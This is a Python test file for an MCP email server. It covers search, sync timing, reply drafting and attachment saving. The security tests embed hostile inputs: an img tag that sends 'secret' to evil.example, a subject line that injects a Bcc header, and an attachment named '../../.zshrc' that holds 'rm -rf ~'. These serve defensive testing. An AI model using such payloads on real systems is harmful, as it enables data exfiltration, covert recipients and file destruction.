"""Design scenarios S1 to S5 through an in-process MCP client."""

from __future__ import annotations

from typing import TYPE_CHECKING, Any

from mcp import Client

from factories import make_message

if TYPE_CHECKING:
    from mcp.server.mcpserver import MCPServer

    from fakes import FakeClock
    from imapserver.server import FakeImapServer


async def call(server: MCPServer, tool: str, **arguments: Any) -> dict[str, Any]:
    async with Client(server) as client:
        result = await client.call_tool(tool, arguments)
    assert not result.is_error, result.content
    assert result.structured_content is not None
    return result.structured_content


async def call_error(server: MCPServer, tool: str, **arguments: Any) -> str:
    async with Client(server) as client:
        result = await client.call_tool(tool, arguments)
    assert result.is_error
    return " ".join(getattr(c, "text", "") for c in result.content)


class TestS1FindAFact:
    async def test_search_then_read_answers_from_the_index(
        self, server: MCPServer, imap_server: FakeImapServer
    ) -> None:
        imap_server.add_message("Archive", make_message(
            subject="Your car insurance renewal",
            body="Your policy renews on 1 March 2027. Premium: 312 GBP.",
        ))  # fmt: skip
        imap_server.add_message("INBOX", make_message(subject="Lunch?", body="Noon?"))

        found = await call(server, "search_mail", query="car insurance renewal")
        top = found["results"][0]
        message = await call(server, "get_message", id=top["id"])

        assert found["sync"]["state"] == "complete"
        assert found["total"] == 1
        assert top["folders"] == ["Archive"]
        assert top["untrusted"]["subject"] == "Your car insurance renewal"
        assert "[renews]" in top["untrusted"]["snippet"]
        assert "1 March 2027" in message["untrusted"]["body"]

    async def test_tools_are_annotated(self, server: MCPServer) -> None:
        async with Client(server) as client:
            tools = {t.name: t for t in (await client.list_tools()).tools}

        assert set(tools) == {
            "search_mail", "get_message", "list_folders", "sync_now",
            "download_attachment", "create_draft",
        }  # fmt: skip
        for name in ("search_mail", "get_message", "list_folders", "sync_now"):
            annotations = tools[name].annotations
            assert annotations is not None
            assert annotations.read_only_hint is True
        create = tools["create_draft"].annotations
        assert create is not None
        assert create.read_only_hint is False
        assert create.destructive_hint is False


class TestS2SyncOnAToolCall:
    async def test_a_stale_index_syncs_before_it_answers(
        self, server: MCPServer, imap_server: FakeImapServer, clock: FakeClock
    ) -> None:
        await call(server, "search_mail", query="invoice")
        imap_server.add_message("INBOX", make_message(subject="Invoice 2026-10"))

        clock.advance(40 * 60)
        found = await call(server, "search_mail", query="invoice")

        assert [r["untrusted"]["subject"] for r in found["results"]] == [
            "Invoice 2026-10"
        ]
        assert found["sync"]["age_seconds"] == 0

    async def test_a_fresh_index_does_not_sync(
        self, server: MCPServer, imap_server: FakeImapServer, clock: FakeClock
    ) -> None:
        await call(server, "list_folders")
        imap_server.add_message("INBOX", make_message(subject="Too new"))

        clock.advance(4 * 60)
        found = await call(server, "search_mail", query="new")

        assert found["results"] == []
        assert found["sync"]["age_seconds"] == 240


class TestS4DraftAReply:
    async def test_a_reply_draft_lands_in_drafts_with_reply_headers(
        self, server: MCPServer, imap_server: FakeImapServer
    ) -> None:
        imap_server.add_message("INBOX", make_message(
            subject="Boiler repair", sender="Plumber <fixit@plumb.example>",
            message_id="<quote-1@plumb.example>",
        ))  # fmt: skip
        found = await call(server, "search_mail", query="boiler")

        draft = await call(
            server, "create_draft", to=["fixit@plumb.example"], subject="Boiler repair",
            body="Thursday at 9 is **fine**.\n\n![x](https://track.example/p.gif)",
            in_reply_to=found["results"][0]["id"],
        )  # fmt: skip

        (stored,) = imap_server.mailboxes["Drafts"].messages
        raw = stored.raw.decode()
        assert "\\Draft" in stored.flags
        assert draft["folder"] == "Drafts"
        assert draft["new_recipients"] == ["fixit@plumb.example"]
        assert "Subject: Re: Boiler repair" in raw
        assert "In-Reply-To: <quote-1@plumb.example>" in raw
        assert "<strong>fine</strong>" in raw
        assert "<img" not in raw
        assert '<a href="https://track.example/p.gif">x</a>' in raw

    async def test_raw_html_in_the_body_is_escaped(
        self, server: MCPServer, imap_server: FakeImapServer
    ) -> None:
        await call(server, "create_draft", to=["a@b.example"], subject="Hi",
                   body='<img src="https://evil.example/?d=secret">')  # fmt: skip

        raw = imap_server.mailboxes["Drafts"].messages[0].raw.decode()
        assert "<img" not in raw.split("text/html", 1)[1]

    async def test_a_header_injection_in_the_subject_is_refused(
        self, server: MCPServer, imap_server: FakeImapServer
    ) -> None:
        error = await call_error(
            server, "create_draft", to=["a@b.example"],
            subject="Hi\nBcc: x@evil.example", body="x",
        )  # fmt: skip

        assert "line break" in error
        assert imap_server.mailboxes["Drafts"].messages == []


class TestS5SaveAnAttachment:
    async def test_the_attachment_is_saved_once_and_never_overwrites(
        self, server: MCPServer, imap_server: FakeImapServer, tmp_path: Any
    ) -> None:
        pdf = b"%PDF-1.7 renewal document"
        imap_server.add_message("INBOX", make_message(
            subject="Acme invoice",
            attachments=[("acme-invoice-2026-10.pdf", "application/pdf", pdf)],
        ))  # fmt: skip
        found = await call(server, "search_mail", query="acme")
        hit = found["results"][0]
        part = hit["attachments"][0]["part"]

        first = await call(server, "download_attachment", id=hit["id"], part=part)
        second = await call(server, "download_attachment", id=hit["id"], part=part)

        downloads = tmp_path / "Downloads"
        assert first["path"] == str(downloads / "acme-invoice-2026-10.pdf")
        assert second["path"] == str(downloads / "acme-invoice-2026-10 (1).pdf")
        assert (downloads / "acme-invoice-2026-10.pdf").read_bytes() == pdf

    async def test_a_hostile_filename_stays_in_the_download_directory(
        self, server: MCPServer, imap_server: FakeImapServer, tmp_path: Any
    ) -> None:
        imap_server.add_message("INBOX", make_message(
            subject="Evil", attachments=[("../../.zshrc", "text/plain", b"rm -rf ~")],
        ))  # fmt: skip
        found = await call(server, "search_mail", query="evil")
        hit = found["results"][0]

        saved = await call(server, "download_attachment", id=hit["id"],
                           part=hit["attachments"][0]["part"])  # fmt: skip

        assert saved["path"] == str(tmp_path / "Downloads" / "zshrc")
        assert not (tmp_path / ".zshrc").exists()
